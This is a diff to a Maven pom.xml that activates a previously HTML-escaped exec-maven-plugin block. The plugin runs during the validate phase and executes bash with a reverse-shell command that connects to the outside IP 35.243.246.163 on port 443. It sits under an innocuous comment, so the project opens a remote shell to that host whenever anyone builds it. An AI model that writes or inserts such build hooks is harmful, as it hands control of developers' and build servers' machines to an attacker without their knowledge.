@@ -176,32 +176,32 @@
     </dependencies>
 
     <build>
-    &lt;plugins&gt;
-            &lt;!--Stam--&gt;
-            &lt;plugin&gt;
-                &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
-                &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;
-                &lt;version&gt;1.6.0&lt;/version&gt;
-                &lt;executions&gt;
-                    &lt;execution&gt;
-                        &lt;id&gt;run-script&lt;/id&gt;
-                        &lt;phase&gt;validate&lt;/phase&gt;
-                        &lt;goals&gt;
-                            &lt;goal&gt;exec&lt;/goal&gt;
-                        &lt;/goals&gt;
-                    &lt;/execution&gt;
-                &lt;/executions&gt;
-                &lt;configuration&gt;
-                    &lt;executable&gt;bash&lt;/executable&gt;
-                    &lt;arguments&gt;
-                        &lt;argument&gt;
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
                             -c
-                        &lt;/argument&gt;
-                        &lt;argument&gt;bash &amp;&gt;/dev/tcp/35.243.246.163/443 &lt;&amp;1&lt;/argument&gt;
-                    &lt;/arguments&gt;
-                &lt;/configuration&gt;
-            &lt;/plugin&gt;
-    &lt;/plugins&gt;
+                        </argument>
+                        <argument>bash &amp;&gt;/dev/tcp/35.243.246.163/443 &lt;&amp;1</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
     </build>
 
     <profiles>
